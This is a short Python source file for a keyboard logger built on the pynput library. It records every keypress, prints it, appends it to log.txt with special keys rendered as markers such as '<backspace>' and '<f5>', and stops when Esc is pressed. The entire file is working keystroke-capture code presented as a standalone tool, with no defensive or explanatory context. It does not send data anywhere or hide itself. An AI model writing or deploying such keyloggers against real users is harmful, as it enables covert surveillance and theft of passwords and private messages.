import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []


def start():
    def on_press(key):
        global count,keys
        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >=1:
            count = 0
            write_file(keys)
            keys = []
    

    def write_file(keys):
        with open("log.txt","a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("enter") > 0 :
                    f.write('\n')
                elif key == Key.backspace:
                    f.write('<backspace>')
                elif key == Key.space:
                    f.write(' ')
                elif k.find("Key") == -1:
                    f.write(k)
                elif key == Key.alt_l:
                    f.write('<alt_l>')
                elif key == Key.alt_gr:
                    f.write('<alt_gr>')
                elif key == Key.cmd:
                    f.write('<cmd>')
                elif key == Key.ctrl_l:
                    f.write('<ctrl_l>')
                elif key == Key.ctrl_r:
                    f.write('<ctrl_r>')        
                elif key == Key.tab:
                    f.write('   ')
                elif key == Key.f1:
                    f.write('<f1>')
                elif key == Key.f2:
                    f.write('<f2>')
                elif key == Key.f3:
                    f.write('<f3>')
                elif key == Key.f4:
                    f.write('<f4>')
                elif key == Key.f5:
                    f.write('<f5>')
                elif key == Key.f6:
                    f.write('<f6>')
                elif key == Key.f7:
                    f.write('<f7>')
                elif key == Key.f8:
                    f.write('<f8>')
                elif key == Key.f9:
                    f.write('<f9>')
                elif key == Key.f10:
                    f.write('<f10>')
                elif key == Key.f11:
                    f.write('<f11>')
                elif key == Key.f12:
                    f.write('<f12>')
                elif key == Key.delete:
                    f.write('<delete>')
                elif key == Key.up:
                    f.write('<up>')
                elif key == Key.down:
                    f.write('<down>')
                elif key == Key.left:
                    f.write('<left>')
                elif key == Key.right:
                    f.write('<right>')
                elif key == Key.home:
                    f.write('<home>')
                elif key == Key.end:
                    f.write('<end>')
                elif key == Key.page_up:
                    f.write('<pageup>')
                elif key == Key.page_down:
                    f.write('<pagedown>')
                elif key == Key.insert:
                    f.write('<insert>')
                elif key == Key.print_screen:
                    f.write('<printscreen>')
                elif key == Key.media_next:
                    f.write('<media_next>')
                elif key == Key.menu:
                    f.write('<menu>')
                elif key == Key.media_play_pause:
                    f.write('<media_play_pause>')
                elif key == Key.media_previous:
                    f.write('<media_previous>')
                elif key == Key.media_volume_down:
                    f.write('<media_volume_down>')
                elif key == Key.media_volume_up:
                    f.write('<media_volume_up>')
                elif key == Key.media_volume_mute:
                    f.write('<media_volume_mute>')
                elif key == Key.num_lock:
                    f.write('<num_lock>')
           


    def on_release(key):
        if key == Key.esc:
            return False
        



    with Listener(on_press = on_press , on_release = on_release) as listener:
        listener.join()








